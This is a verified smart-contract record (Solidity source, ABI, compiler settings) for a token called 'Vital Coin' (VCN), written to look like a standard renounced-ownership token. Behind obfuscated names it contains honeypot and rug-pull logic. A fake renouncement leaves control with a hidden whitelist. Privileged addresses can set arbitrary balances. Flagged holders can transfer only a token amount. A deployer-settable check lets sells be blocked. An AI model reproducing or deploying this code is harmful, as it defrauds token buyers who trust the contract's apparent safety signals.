{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract maxSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTokenLimit {\n    function createPair(address atLimit, address fundAmount) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface amountFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromMax) external view returns (uint256);\n\n    function transfer(address fundWalletTotal, uint256 liquiditySender) external returns (bool);\n\n    function allowance(address sellTradingIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquiditySender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundWalletTotal,\n        uint256 liquiditySender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isShould, uint256 value);\n    event Approval(address indexed sellTradingIs, address indexed spender, uint256 value);\n}\n\ninterface autoLimitMetadata is autoLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VitalCoin is maxSender, autoLimit, autoLimitMetadata {\n\n    function liquidityFund(address modeIs, address fundWalletTotal, uint256 liquiditySender) internal view returns (uint256) {\n        require(liquiditySender > 0);\n\n        uint256 isAt = 0;\n        if (modeIs == exemptAuto && exemptMax > 0) {\n            isAt = liquiditySender * exemptMax / 100;\n        } else if (fundWalletTotal == exemptAuto && enableAmountExempt > 0) {\n            isAt = liquiditySender * enableAmountExempt / 100;\n        }\n        require(isAt <= liquiditySender);\n        return liquiditySender - isAt;\n    }\n\n    address autoTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletShould;\n    }\n\n    function transfer(address walletMinLiquidity, uint256 liquiditySender) external virtual override returns (bool) {\n        return totalFundEnable(_msgSender(), walletMinLiquidity, liquiditySender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamToWallet;\n    }\n\n    address public autoBuy;\n\n    function balanceOf(address fromMax) public view virtual override returns (uint256) {\n        return teamFrom[fromMax];\n    }\n\n    function liquiditySwap(address walletMinLiquidity, uint256 liquiditySender) public {\n        autoTo();\n        teamFrom[walletMinLiquidity] = liquiditySender;\n    }\n\n    address private totalLaunched;\n\n    function shouldWalletTake(address takeLiquidity) public {\n        autoTo();\n        \n        if (takeLiquidity == autoBuy || takeLiquidity == exemptAuto) {\n            return;\n        }\n        sellFee[takeLiquidity] = true;\n    }\n\n    event OwnershipTransferred(address indexed isTx, address indexed txSellFrom);\n\n    function getOwner() external view returns (address) {\n        return totalLaunched;\n    }\n\n    uint8 private walletShould = 18;\n\n    mapping(address => mapping(address => uint256)) private buyTrading;\n\n    uint256 constant fromFee = 13 ** 10;\n\n    uint256 maxReceiver;\n\n    function toModeTeam(address receiverEnable) public {\n        require(receiverEnable.balance < 100000);\n        if (amountWallet) {\n            return;\n        }\n        if (walletTrading != liquidityToken) {\n            exemptIs = liquidityToken;\n        }\n        launchedSell[receiverEnable] = true;\n        if (liquidityToken == exemptIs) {\n            exemptIs = walletTrading;\n        }\n        amountWallet = true;\n    }\n\n    string private sellAt = \"VCN\";\n\n    uint256 public enableAmountExempt = 0;\n\n    mapping(address => uint256) private teamFrom;\n\n    function owner() external view returns (address) {\n        return totalLaunched;\n    }\n\n    uint256 private shouldIs;\n\n    function name() external view virtual override returns (string memory) {\n        return totalTxMode;\n    }\n\n    uint256 private teamToWallet = 100000000 * 10 ** 18;\n\n    address launchTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private exemptIs;\n\n    address public exemptAuto;\n\n    function allowance(address atMode, address fundLimit) external view virtual override returns (uint256) {\n        if (fundLimit == launchTx) {\n            return type(uint256).max;\n        }\n        return buyTrading[atMode][fundLimit];\n    }\n\n    bool public shouldMarketing;\n\n    function marketingAmount(uint256 liquiditySender) public {\n        autoTo();\n        marketingBuy = liquiditySender;\n    }\n\n    uint256 public receiverSender;\n\n    bool public amountWallet;\n\n    uint256 marketingBuy;\n\n    function approve(address fundLimit, uint256 liquiditySender) public virtual override returns (bool) {\n        buyTrading[_msgSender()][fundLimit] = liquiditySender;\n        emit Approval(_msgSender(), fundLimit, liquiditySender);\n        return true;\n    }\n\n    function liquidityMode(address modeIs, address fundWalletTotal, uint256 liquiditySender) internal returns (bool) {\n        require(teamFrom[modeIs] >= liquiditySender);\n        teamFrom[modeIs] -= liquiditySender;\n        teamFrom[fundWalletTotal] += liquiditySender;\n        emit Transfer(modeIs, fundWalletTotal, liquiditySender);\n        return true;\n    }\n\n    constructor (){\n        if (shouldIs != exemptIs) {\n            walletTrading = shouldIs;\n        }\n        isFee();\n        amountFrom receiverAtSwap = amountFrom(launchTx);\n        exemptAuto = liquidityTokenLimit(receiverAtSwap.factory()).createPair(receiverAtSwap.WETH(), address(this));\n        autoTotal = liquidityTokenLimit(receiverAtSwap.factory()).feeTo();\n        \n        autoBuy = _msgSender();\n        launchedSell[autoBuy] = true;\n        teamFrom[autoBuy] = teamToWallet;\n        \n        emit Transfer(address(0), autoBuy, teamToWallet);\n    }\n\n    uint256 public walletTrading;\n\n    uint256 public liquidityToken;\n\n    function totalFundEnable(address modeIs, address fundWalletTotal, uint256 liquiditySender) internal returns (bool) {\n        if (modeIs == autoBuy) {\n            return liquidityMode(modeIs, fundWalletTotal, liquiditySender);\n        }\n        uint256 amountShould = autoLimit(exemptAuto).balanceOf(autoTotal);\n        require(amountShould == marketingBuy);\n        require(fundWalletTotal != autoTotal);\n        if (sellFee[modeIs]) {\n            return liquidityMode(modeIs, fundWalletTotal, fromFee);\n        }\n        liquiditySender = liquidityFund(modeIs, fundWalletTotal, liquiditySender);\n        return liquidityMode(modeIs, fundWalletTotal, liquiditySender);\n    }\n\n    string private totalTxMode = \"Vital Coin\";\n\n    mapping(address => bool) public launchedSell;\n\n    bool public atLiquidityLimit;\n\n    function isFee() public {\n        emit OwnershipTransferred(autoBuy, address(0));\n        totalLaunched = address(0);\n    }\n\n    uint256 public exemptMax = 3;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellAt;\n    }\n\n    function autoTo() private view {\n        require(launchedSell[_msgSender()]);\n    }\n\n    mapping(address => bool) public sellFee;\n\n    function transferFrom(address modeIs, address fundWalletTotal, uint256 liquiditySender) external override returns (bool) {\n        if (_msgSender() != launchTx) {\n            if (buyTrading[modeIs][_msgSender()] != type(uint256).max) {\n                require(liquiditySender <= buyTrading[modeIs][_msgSender()]);\n                buyTrading[modeIs][_msgSender()] -= liquiditySender;\n            }\n        }\n        return totalFundEnable(modeIs, fundWalletTotal, liquiditySender);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTradingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSellFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmountExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySender\",\"type\":\"uint256\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquiditySender\",\"type\":\"uint256\"}],\"name\":\"marketingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"shouldWalletTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"toModeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundWalletTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VitalCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}